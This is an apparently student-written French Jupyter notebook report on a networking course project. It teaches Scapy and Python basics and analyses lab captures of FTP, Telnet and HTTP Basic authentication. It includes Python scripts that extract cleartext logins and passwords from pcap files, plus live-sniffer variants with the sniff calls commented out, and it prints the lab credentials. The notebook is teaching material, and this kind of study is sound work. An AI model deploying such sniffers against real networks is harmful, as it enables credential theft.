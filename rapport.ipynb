{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8a2e7d37",
   "metadata": {},
   "source": [
    "# Les bases avant de commencer"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ad8c611f",
   "metadata": {},
   "source": [
    "## Introduction"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "adf169c7",
   "metadata": {},
   "source": [
    "La **SAE 204**, dite **SAE Projet Intégratif**, a pour objectif de nous faire mobiliser de **nombreuses compétences acquises** durant notre première année. Elle s'étale sur une durée d’environ **deux mois** et se déroule en **trois phases principales**.\n",
    "\n",
    "La **première phase** consiste à prendre en main des outils spécifiques comme **Jupyter Notebook**, qui permet de rédiger des rapports intégrant du **code Python**, et **Scapy**, un outil puissant pour **manipuler des paquets réseau** en Python.\n",
    "\n",
    "La **deuxième phase** vise à développer une **application personnelle** en Python utilisant **Scapy**, avec un **intérêt pédagogique**. Cette application doit porter sur un point particulier des **technologies réseau**, comme un **aspect technique avancé** ou une **faille de sécurité**.\n",
    "\n",
    "Enfin, la **troisième phase** consiste à spécifier et développer un **outil Python** permettant de **mettre en évidence** et **d'exploiter** une ou plusieurs **vulnérabilités connues** dans des **protocoles réseau**.\n",
    "\n",
    "L’**objectif final** de cette SAE est donc de nous permettre de **maîtriser concrètement** les outils **Jupyter Notebook** et **Scapy** à travers un **projet complet** mêlant **développement**, **documentation** et **sécurité réseau**.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "07d32097",
   "metadata": {},
   "source": [
    "## Commandes d'introduction de Scapy"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54eb2ff4",
   "metadata": {},
   "source": [
    "Pour cette SAE nous allons utiliser la bibliothèque **Scapy** pour interagir avec les interfaces et paquets réseau.\n",
    "\n",
    "Pour commencer nous devons importer tous les modules de Scapy via `from scapy.all import *`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fb55dc31",
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a9b21363",
   "metadata": {},
   "source": [
    "Une fois cela fais, nous pouvons afficher plusieurs informations liées à la configuration réseau tel que :\n",
    "\n",
    "- La **version de Scapy** utilisée, avec le code :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "280939f9",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(f\"{conf.version} est la version de Scapy.\") #résultat: 2.6.1 est la version de Scapy."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "53f88751",
   "metadata": {},
   "source": [
    "- L’**interface réseau** active actuellement détectée par Scapy grâce à :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1eaad1c9",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(f\"{conf.iface} est l'interface réseau utilisée.\") #résultat: (carte RZO) est l'interface réseau utilisée."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ead83494",
   "metadata": {},
   "source": [
    "- La commande précédente donne la référence de la carte si nous voulons afficher le **nom** de cette interface nous utilisons :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "440a5078",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(f\"{conf.iface.name} est l'interface réseau utilisée.\") #résultat: Ethernet est l'interface réseau utilisée."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8a64ea10",
   "metadata": {},
   "source": [
    "\n",
    "- Pour afficher la **table de routage** associée à l’interface active, la commande sera :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "737181b8",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(f\"La table de route de {conf.iface} est: \\n {conf.route}\") #résultat: La table de route de (carte RZO) est:"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b89ab7ac",
   "metadata": {},
   "source": [
    "\n",
    "- Pour afficher la **passerelle par défaut** nous ferons la commande:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3016833f",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(f\"La passerelle par défaut de {conf.iface} est: {conf.route.route('0.0.0.0')[2]}\") #résultat: La passerelle par défaut de (carte RZO) est:\n",
    "#dans la commande conf.route.route('0.0.0.0')[2] le 2 correspond à l'index de la passerelle par défaut dans la table de routage. \n",
    "#L'index 0 correspond au nom de l'interface, l'index 1 a l'@IP associer, et l'index 3 à la passerelle par défaut."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "105647a4",
   "metadata": {},
   "source": [
    "***Scapy*** peut aussi faire de la **création/manipulation** de paquet pour cela il existe de commande qui nous permet certain type de paquet tel que :\n",
    "\n",
    "- Le **paquet IP** (utilisera celle du localhost de base) sera créer avec la fonction :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f4a885ec",
   "metadata": {},
   "outputs": [],
   "source": [
    "packetIP = IP()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3c0d9b17",
   "metadata": {},
   "source": [
    " - Le **paquet UDP** (vide de base) sera créer avec la fonction :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fca61fd1",
   "metadata": {},
   "outputs": [],
   "source": [
    "packetUDP = UDP()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a6abea5a",
   "metadata": {},
   "source": [
    " Une fois ces paquets créer nous pouvont nous intérrésser à l'affichage des paquets pour cela il existe **2** type de commande qui sont:\n",
    "  \n",
    " - Le **résumé** du paquet est affiché via "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e92beea5",
   "metadata": {},
   "outputs": [],
   "source": [
    "paquet1= IP()/UDP()\n",
    "print(f\"Le résumé du paquet est: {paquet1.summary()}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "18bdd78a",
   "metadata": {},
   "source": [
    "- Le **détail complet** du paquet est affiché avec:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "313b87ce",
   "metadata": {},
   "outputs": [],
   "source": [
    "paquet1= IP()/UDP()\n",
    "paquet1.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b08e81fc",
   "metadata": {},
   "source": [
    "\n",
    "Enfin, le programme crée un **nouveau paquet IP/UDP** (`paquet2`) en spécifiant manuellement une **adresse IP source** (`192.168.1.1`) et une **adresse IP de destination** (`192.168.1.254`), toujours sans contenu de charge utile.\n",
    "\n",
    "Ce programme constitue une **bonne base de prise en main de Scapy**, en explorant à la fois la configuration réseau locale et la création de paquets IP personnalisés.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f868379",
   "metadata": {},
   "source": [
    "## Fonction basique de ***Python***"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bc95557e",
   "metadata": {},
   "source": [
    "***Python*** est un langage de programmation qui intègre de base des fonctionnalité très large et utile pour le traitement de données. Pour la suite de la **SAE** il nous faut revoir les basiques.\n",
    "\n",
    "Pour commencer, avec ***Python*** nous pouvons créer et modifier des variables, pour cela il nous suffit juste de donner un nom à cette variable puis suivre le nom d'un \"=\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e29cb5c8",
   "metadata": {},
   "outputs": [],
   "source": [
    "variable ="
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ee35ba9c",
   "metadata": {},
   "source": [
    "Une fois notre variable créer nous pouvons insérer des valeur dedans, ces valeurs peuvent être principalement des nombres (int), des nombres à virgule (float), du texte (str), des valeurs et des liste (list)\n",
    "\n",
    "Pour déterminer ce que va contenir notre variable nous utilisont différent moyen.\n",
    "\n",
    "- Pour déterminer des variables de type **int** et **float** nous devons juste suivre la valeur derrière le signe **\"=\"**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "352ff5f4",
   "metadata": {},
   "outputs": [],
   "source": [
    "Variable1 = 1 \n",
    "Variable2 = 2.2"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b6085c1c",
   "metadata": {},
   "source": [
    "- Ensuite pour déterminer des variables de type **str** nous devons les déclarer avec `' '` ou `\" \"`, les guillements simple ou double définiront les valeur comme du texte."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8fa4ac2c",
   "metadata": {},
   "outputs": [],
   "source": [
    "Variable = 'déclarer avec guillements simples'\n",
    "Variable = \"déclarer avec guillements doubles\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "73f49752",
   "metadata": {},
   "source": [
    "- Enfin pour déterminer une variable comme un liste alors il faut utiliser les `[ ]`, puis séparer les valeur avec des `,` entre chaque valeur de la liste. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4689d341",
   "metadata": {},
   "outputs": [],
   "source": [
    "variable = [1, 2, 3, 4, 5]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1a2aec35",
   "metadata": {},
   "source": [
    "Bien sur une liste peut aussi contenir du texte pour cela il suffit juste de mettre **des guillemets**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f1dc4570",
   "metadata": {},
   "outputs": [],
   "source": [
    "variable = ['liste', 'avec', 'des', 'mots']"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0bdb466f",
   "metadata": {},
   "source": [
    "***Python*** possède aussi une fonctionnalité pour **ouvrir/lire/modifier** pour cela nous utilisons différentes commande python tel que :\n",
    "\n",
    "Pour ouvrir un fichier en Python, on utilise la fonction `open()`. Cette fonction permet d'accéder au contenu d'un fichier en spécifiant le chemin du fichier ainsi que le mode d'ouverture.\n",
    "\n",
    "Les modes d'ouverture courants sont :\n",
    "\n",
    "- `\"r\"` : mode lecture (read) — pour lire le contenu du fichier.\n",
    "- `\"w\"` : mode écriture (write) — pour écrire dans un fichier en écrasant son contenu.\n",
    "- `\"a\"` : mode ajout (append) — pour ajouter du contenu à la fin du fichier existant.\n",
    "- `\"x\"` : mode écriture exclusive — pour créer un fichier et écrire dedans, mais échoue si le fichier existe déjà.\n",
    "- `\"b\"` : mode binaire — pour lire ou écrire des fichiers non textuels (images, vidéos, etc.).\n",
    "- `\"t\"` : mode texte — mode par défaut pour lire ou écrire du texte.\n",
    "\n",
    "voici un exemple pour ouvrir un un fichier s'appellant `text.txt` :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "67bbc074",
   "metadata": {},
   "outputs": [],
   "source": [
    "text = open(\"Étape 3/text.txt\", \"rt\")\n",
    "print(\"Voici ce que contient le fichier 'text.txt':\")\n",
    "print(text.read())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cbf19982",
   "metadata": {},
   "source": [
    "***Python*** nous propose d'ouvrir un fichier texte en mode lecture et de lire son contenu **ligne par ligne**.  \n",
    "Il utilise la méthode `readline()` pour récupérer une ligne à la fois, ce qui permet de traiter le fichier de manière séquentielle.  \n",
    "\n",
    "Dans cet exemple présenter, seule la première ligne est lue et affichée :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c068f4b4",
   "metadata": {},
   "outputs": [],
   "source": [
    "text = open(\"Étape 3/text.txt\", \"rt\")\n",
    "ligne1 = text.readline()\n",
    "print(\"\\n Voici le contenu du fichier 'text.txt' ligne 1 :\")\n",
    "print(ligne1)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f9069bd3",
   "metadata": {},
   "source": [
    "Avec cette fonction nous pouvons lire un **certaine partie des lignes** du fichier, pour cela il suffit d'utiliser la fonction `readlines()` et ensuite afficher les éléments **comme dans une liste** tel que l'exemple ci-desssous :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "becd6178",
   "metadata": {},
   "outputs": [],
   "source": [
    "fichier = open(\"etape_3/text.txt\", \"rt\")\n",
    "text= fichier.readlines()\n",
    "print(\"\\n Voici les 5 premierère ligne du fichier 'text.txt' en binaire :\")\n",
    "print(text[0:5])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "03ff3e18",
   "metadata": {},
   "source": [
    "Et ainsi ***Python*** propose d'ajouter des éléments grâce à la fonction `.write()`, une fois la commande appeller **il faut remplire les paranthèses avec le contenu** souhaiter tel que :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8745284e",
   "metadata": {},
   "outputs": [],
   "source": [
    "fichier = open(\"etape_3/text.txt\", \"at\")\n",
    "fichier.write('\\n\"Got it memorized ?\"')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0fb930a0",
   "metadata": {},
   "source": [
    "Avec les bases poser nous pouvons donc commencer à travailler sur les ***challenges FTP, Telnet et HTPP de la SAE***"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb8502d3",
   "metadata": {},
   "source": [
    "# Challenge FTP"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "90c7e4d8",
   "metadata": {},
   "source": [
    "Ce challenge a pour but d'annalysée et comprendre les trames FTP\n",
    "\n",
    "Pour commencer on importe bien évidemment la librairie \"Scapy\"."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "858a9b12",
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "ftp = rdpcap(\"ftp-total.pcapng\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d0efcb22",
   "metadata": {},
   "source": [
    "## 1. Filtrage du Fichier"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "36eb2b7b",
   "metadata": {},
   "source": [
    "Pour récupérer les trames FTP on peut uttilisée les ports. FTP est uttilisée uniquement depuis les ports **20** ou **21**\n",
    "On vérifie donc uniquement si le port **source** ou **destination** est le **20** ou **21**.\n",
    "\n",
    "On tape donc en filtre sur **Wireshark**\n",
    "\n",
    "`tcp.port == 21 or tcp.port == 20 || ftp`\n",
    "\n",
    "Cela nous affichie bien toute les trames FTP avec les SYN, SYN/ACK et ACK\n",
    "\n",
    "![](https://i.ibb.co/vvsNzhn4/Capture-d-cran-2025-06-01-005641.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f3b18247",
   "metadata": {},
   "source": [
    "Lorsque l'on regarde la capture FTP, on obtient plein d'information comme l'ip du serveur (**10.2.12.16**) ou aussi l'ip du client (**10.2.4.3**). On voit également plusieur noms de paquets comme USER, PASS, SYST, LIST et pleins d'autre.\n",
    "\n",
    "Voici la liste de certaine de ces requêtes applicative :\n",
    "\n",
    "* **USER** : Donne le nom d'uttilisateurs\n",
    "* **PASS** : Donne le mot-de-passe\n",
    "* **SYST** : Demande le système d'exploitation du serveur\n",
    "* **PORT** : Les 4 premier chiffre correspondent à l'adresse ip (ici 10,2,4,3) et les deux dernier corresponde a deux chiffre P1 et P2 permetant de faire un calcul qui donnera le port (*P1 * 256 + P2*)\n",
    "* **QUIT** : Permet de quitter la connexion"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "462f0828",
   "metadata": {},
   "source": [
    "## 3. Extraction du fichier transféré"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3cf95187",
   "metadata": {},
   "source": [
    "Dans la connexion, un fichier y est transferée. On peut le récupérée de la manière suivante :\n",
    "\n",
    "* Allez dans `Fichier > Exporter Objet > FTP-DATA`\n",
    "* Cela devrez vous ouvrir un fenêtre contenant un fichier avec comme nom **ftpdoc.odt**\n",
    "* Faite `Enregistrer`\n",
    "\n",
    "Et voilà le fichier transfèrée vous appartient !"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c312e964",
   "metadata": {},
   "source": [
    "## 4. Développement d’un “Exploit” en Python"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b28311d",
   "metadata": {},
   "source": [
    "Voici un code python qui regarde si il y a une connexion FTP qui se réalise\n",
    "\n",
    "Ce premier code permet de récupéré nom d'uttilisateur, mot-de-passe et l'addresse ip et le port du client depuis un fichier `.pcapng`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "80cb3e1e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "\n",
    "def parse_ftp_from_pcapng(packets):\n",
    "    for pkt in packets:\n",
    "        if pkt.haslayer(TCP) and (pkt[TCP].dport == 21 or pkt[TCP].sport == 21):\n",
    "            if Raw in pkt:\n",
    "                try:\n",
    "                    payload = pkt[Raw].load.decode('utf-8', errors='ignore')\n",
    "                    if \"USER\" in payload or \"PASS\" in payload:\n",
    "                        if \"USER\" in payload:\n",
    "                            user = re.search(r\"USER (.+?)\\r\\n\", payload)\n",
    "                            if user:\n",
    "                                print(f\"Nom d'utilisateur : {user.group(1)}\")\n",
    "                        if \"PASS\" in payload:\n",
    "                            passwd = re.search(r\"PASS (.+?)\\r\\n\", payload)\n",
    "                            if passwd:\n",
    "                                print(f\"Mot de passe : {passwd.group(1)}\")\n",
    "                except Exception as e:\n",
    "                    print(\"Erreur lors du traitement d’un paquet:\", e)\n",
    "\n",
    "parse_ftp_from_pcapng(ftp)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0510dda1",
   "metadata": {},
   "source": [
    "Nom d'utilisateur : touriste\n",
    "\n",
    "Mot de passe : 3aboqphie=3qbc!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3a6ed320",
   "metadata": {},
   "source": [
    "Et voici le même code que ci-dessus mais qui regarde directement dans le réseaux"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f7190fd",
   "metadata": {},
   "outputs": [],
   "source": [
    "def parse_ftp_packet(pkt):\n",
    "    if pkt.haslayer(TCP) and (pkt[TCP].dport == 21 or pkt[TCP].sport == 21):\n",
    "        if pkt.haslayer(Raw):\n",
    "            try:\n",
    "                payload = pkt[Raw].load.decode('utf-8', errors='ignore')\n",
    "                if \"USER\" in payload or \"PASS\" in payload:\n",
    "                    if \"USER\" in payload:\n",
    "                        user = re.search(r\"USER (.+?)\\r\\n\", payload)\n",
    "                        if user:\n",
    "                            print(f\"Nom d'utilisateur : {user.group(1)}\")\n",
    "                    if \"PASS\" in payload:\n",
    "                        passwd = re.search(r\"PASS (.+?)\\r\\n\", payload)\n",
    "                        if passwd:\n",
    "                            print(f\"Mot de passe : {passwd.group(1)}\")\n",
    "            except Exception as e:\n",
    "                print(\"Erreur lors du traitement d’un paquet:\", e)\n",
    "\n",
    "print(\"Démarrage de l'écoute du trafic FTP sur le réseau...\")\n",
    "# sniff(filter=\"tcp port 21\", prn=parse_ftp_packet, store=0)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cc33d87b",
   "metadata": {},
   "source": [
    "# Challenge Telnet"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c5d1ce26",
   "metadata": {},
   "source": [
    "Ce challenge a pour but d'analysée et comprendre les trames Telnet\n",
    "\n",
    "Pour commencer, comme pour le challenge précédent on importe bien évidemment la librairie \"Scapy\" qui serra uttile pour les programmes Python."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1d6b7e76",
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "telnet = rdpcap(\"telnet-total.pcapng\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c4127df2",
   "metadata": {},
   "source": [
    "## Introduction au Telnet"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "09d7bb09",
   "metadata": {},
   "source": [
    "Comme pour les trames FTP, Wireshark n'affiche pas toute les trames Telnet avec le nom \"Telnet\". Certaines sont afficher en TCP comme les SYN, SYN/ACK, ACK et FIN.\n",
    "\n",
    "On doit donc récupérer toute les trames qui uttilise le port Telnet, soit le 23.\n",
    "\n",
    "La commande est donc la suivante : `tcp.port == 23 || telnet`\n",
    "\n",
    "![](https://i.ibb.co/CswFWMy9/Capture-d-cran-2025-06-01-010105.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a5c976e9",
   "metadata": {},
   "source": [
    "## Observation des trames"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0c1d8fd6",
   "metadata": {},
   "source": [
    "Telnet fonctionne différament du FTP, ici on a pas de requêtes applicative qui nous donne a quoi correspond chaque action.\n",
    "\n",
    "Lorsque l'on regarde la capture, on obtient plein d'information comme notament l'ip du serveur (**10.2.12.16**) ou aussi l'ip du client (**10.2.4.3**).\n",
    "\n",
    "On peut aussi obtenir des informations sensibles en clair comme le login et mot de passe. Ce ci sont envoyée lettre par lettre car la manière dont fonctionne le telnet est que dès que l'uttilisateur tape un carractère pour le login, celui-ci est directement envoyée au serveur qui lui répond cette lettre comme une manière de lui dire qu'il a bien reçu son information.\n",
    "Pour le mot-de-passe le serveur lui envoie juste un ACK pour lui prouver qu'il a bien reçu pour pas que le mot-de-passe soit récupérée \n",
    "\n",
    "Ainsi on peut obtenir ceci :\n",
    "\n",
    "`login: marie`\n",
    "\n",
    "`Password: popins`\n",
    "\n",
    "Juste après son login l'uttilisateur reçoit certaine données du serveur comme la dernière connexion.\n",
    "\n",
    "De plus, l'uttilisateur vas réalisée quelque commande après sa connexion. Les voici :\n",
    "\n",
    "`ls -al`\n",
    "`cat toto`\n",
    "`exit`\n",
    "\n",
    "Pour les deux première commande, celle-ci sont des commande bassique Linux. `ls - all` vas permettre de voir tout les fichier présent dans la racine sélectionnée et `cat toto` permet d'afficher le contenu du fichier toto.\n",
    "La dernière commande `exit` vas arrêter la connexion telnet."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7b7531b6",
   "metadata": {},
   "source": [
    "## Script Python"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a36cf2fd",
   "metadata": {},
   "source": [
    "Après tout ce que l'on a vu, on peut réalisée un script python qui vas récupérée automatiquement dans un fichier les login et mot-de-passe d'une connexion **Telnet** :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8e5f0d8e",
   "metadata": {},
   "outputs": [],
   "source": [
    "def telnet_pcapng(packets):\n",
    "    state = \"waiting_login_prompt\"\n",
    "    login_buffer = \"\"\n",
    "    password_buffer = \"\"\n",
    "\n",
    "    for pkt in packets:\n",
    "        if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw):\n",
    "            payload = pkt[Raw].load.decode(\"utf-8\", errors=\"ignore\")\n",
    "            sport = pkt[TCP].sport\n",
    "            dport = pkt[TCP].dport\n",
    "\n",
    "            if sport == 23:\n",
    "                if state == \"waiting_login_prompt\" and \"login:\" in payload.lower():\n",
    "                    print(\"Tentative de connexion Telnet\")\n",
    "                    state = \"reading_login\"\n",
    "                    login_buffer = \"\"\n",
    "                elif state == \"waiting_password_prompt\" and \"password:\" in payload.lower():\n",
    "                    state = \"reading_password\"\n",
    "                    password_buffer = \"\"\n",
    "            elif dport == 23:\n",
    "                if state == \"reading_login\":\n",
    "                    for c in payload:\n",
    "                        if c in \"\\r\\n\":\n",
    "                            print(f\"Login : {login_buffer}\")\n",
    "                            state = \"waiting_password_prompt\"\n",
    "                            break\n",
    "                        else:\n",
    "                            login_buffer += c\n",
    "                elif state == \"reading_password\":\n",
    "                    for c in payload:\n",
    "                        if c in \"\\r\\n\":\n",
    "                            print(f\"Mot de passe : {password_buffer}\")\n",
    "                            state = \"done\"\n",
    "                            return\n",
    "                        else:\n",
    "                            password_buffer += c\n",
    "\n",
    "telnet_pcapng(telnet)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc61eda3",
   "metadata": {
    "slideshow": {
     "slide_type": "notes"
    }
   },
   "source": [
    "Tentative de connexion Telnet\n",
    "\n",
    "Login capturé : marie\n",
    "\n",
    "Mot de passe capturé : poppins"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "909dd75a",
   "metadata": {},
   "source": [
    "Le fonctionnement de ce programme est très simple. On regarde toute les trames avec un port source à **23**. Si dans les données envoyée on a un \"*login:*\" alors on lis tout ce que le client envoie ensuite jusqu'à ce qu'il confirme son login, soit jusqu'a ce qu'il appuie sur la touche entrée, en code ce touche s'appelle \"*/r/n*\". On fait en suite la même chose pour le mot-de-passe est l'on récupérée donc notre login et mot-de-passe comme convenue.\n",
    "\n",
    "A partir du code ci-dessus, on peut donc réalisée un programme sniffer qui permet de récupérée login/password d'une connexion **Telnet**."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6e43f56f",
   "metadata": {},
   "outputs": [],
   "source": [
    "def telnet_sniffer(pkt):\n",
    "    global state, login_buffer, password_buffer\n",
    "\n",
    "    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw):\n",
    "        payload = pkt[Raw].load.decode(\"utf-8\", errors=\"ignore\")\n",
    "        sport = pkt[TCP].sport\n",
    "        dport = pkt[TCP].dport\n",
    "\n",
    "        if sport == 23:\n",
    "            if state == \"waiting_login_prompt\" and \"login:\" in payload.lower():\n",
    "                state = \"reading_login\"\n",
    "                login_buffer = \"\"\n",
    "            elif state == \"waiting_password_prompt\" and \"password:\" in payload.lower():\n",
    "                state = \"reading_password\"\n",
    "                password_buffer = \"\"\n",
    "        elif dport == 23:\n",
    "            if state == \"reading_login\":\n",
    "                for c in payload:\n",
    "                    if c in \"\\r\\n\":\n",
    "                        print(f\"Login : {login_buffer}\")\n",
    "                        state = \"waiting_password_prompt\"\n",
    "                        break\n",
    "                    else:\n",
    "                        login_buffer += c\n",
    "            elif state == \"reading_password\":\n",
    "                for c in payload:\n",
    "                    if c in \"\\r\\n\":\n",
    "                        print(f\"Mot de passe : {password_buffer}\")\n",
    "                        state = \"done\"\n",
    "                    else:\n",
    "                        password_buffer += c\n",
    "\n",
    "state = \"waiting_login_prompt\"\n",
    "login_buffer = \"\"\n",
    "password_buffer = \"\"\n",
    "\n",
    "print(\"Démarrage du sniffer Telnet...\")\n",
    "# sniff(filter=\"tcp port 23\", prn=telnet_sniffer, store=False)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "809a4a62",
   "metadata": {},
   "source": [
    "Voilà pour la partie **Telnet**\n",
    "\n",
    "Il nous reste donc un dernier challenge, celui sur **HTTP**"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4f5e8c8",
   "metadata": {},
   "source": [
    "# Challenge HTTP"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "df3a3dbc",
   "metadata": {},
   "source": [
    "Ce challenge a pour but d'analysée et comprendre les trames **HTTP** lors d'une connexion.\n",
    "\n",
    "Pour commencer, comme pour les challenges précédent, on importe la librairie \"Scapy\" qui sera uttile pour les programmes Python."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "08f66b82",
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64\n",
    "http = rdpcap(\"www-total.pcapng\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4e57619c",
   "metadata": {},
   "source": [
    "## Introduction au HTTP"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "525a7f7e",
   "metadata": {},
   "source": [
    "Comme pour les trames FTP et Telnet, Wireshark n'affiche pas toute les trames HTTP avec le nom \"HTTP\". Certaines sont afficher en TCP comme les SYN, SYN/ACK, ACK et FIN.\n",
    "\n",
    "On doit donc récupérer toute les trames qui uttilise le port HTTP, soit ici le port par défault : **80**.\n",
    "\n",
    "La commande est donc la suivante : `tcp.port == 80 || http`\n",
    "\n",
    "![Trames](https://i.ibb.co/ksx0ckvM/Capture-d-cran-2025-06-01-010438.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9d90e677",
   "metadata": {},
   "source": [
    "## Observation des trames"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f66c57f3",
   "metadata": {},
   "source": [
    "Lorsque l'on regarde la capture, on obtient plein d'information comme notament l'ip du serveur (**10.2.12.4**) ou aussi l'ip du client (**10.2.4.3**).\n",
    "\n",
    "On peut aussi obtenir des informations comme le login et le mot de passe de la connexion **HTTP**. Ils apparaîsent Dans la ligne \"*Authorization: Basic*\", plus précisément dans la sous-trames \"*Credentials*\" (appelée **Headers HTTP**) de la partie **HTTP** des trames.\n",
    "\n",
    "![](https://i.ibb.co/FkFr3qfy/Capture-d-cran-2025-06-01-001335.png)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0aa14d14",
   "metadata": {},
   "source": [
    "## Script Python"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8373380d",
   "metadata": {},
   "outputs": [],
   "source": [
    "def http_pcapng(packets):\n",
    "    for pkt in packets:\n",
    "        if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw):\n",
    "            payload = pkt[Raw].load.decode('utf-8', errors='ignore')\n",
    "            for line in payload.split('\\r\\n'):\n",
    "                if line.lower().startswith('authorization: basic '):\n",
    "                    b64_credentials = line.split(' ', 2)[2]\n",
    "                    try:\n",
    "                        decoded_bytes = base64.b64decode(b64_credentials)\n",
    "                        decoded_str = decoded_bytes.decode('utf-8', errors='ignore')\n",
    "                        if ':' in decoded_str:\n",
    "                            login, password = decoded_str.split(':', 1)\n",
    "                            print(f\"Login : {login}\")\n",
    "                            print(f\"Mot de passe : {password}\")\n",
    "                            return\n",
    "                    except Exception as e:\n",
    "                        print(f\"Erreur décodage : {e}\")\n",
    "\n",
    "http_pcapng(http)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab4342d7",
   "metadata": {},
   "source": [
    "Login : donald\n",
    "\n",
    "Mot de passe : P0utine"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4df649b0",
   "metadata": {},
   "source": [
    "Le code analyse chaque paquet du fichier, si celui ci est un **HTTP** alors il continue son analyse. Il regarde si dans la data il a une ligne nomée \"*Authorization: Basic*\". Si c'est le cas, alors il vas décodée la ligne suivante et récupérée le login et le mot-de-passe (Contenu dans le \"*Credentials: login:mdp*\").\n",
    "\n",
    "Voici maintenant le script sniffer **HTTP** qui fonctionne de la même mannière que le précédent."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aac2e9a1",
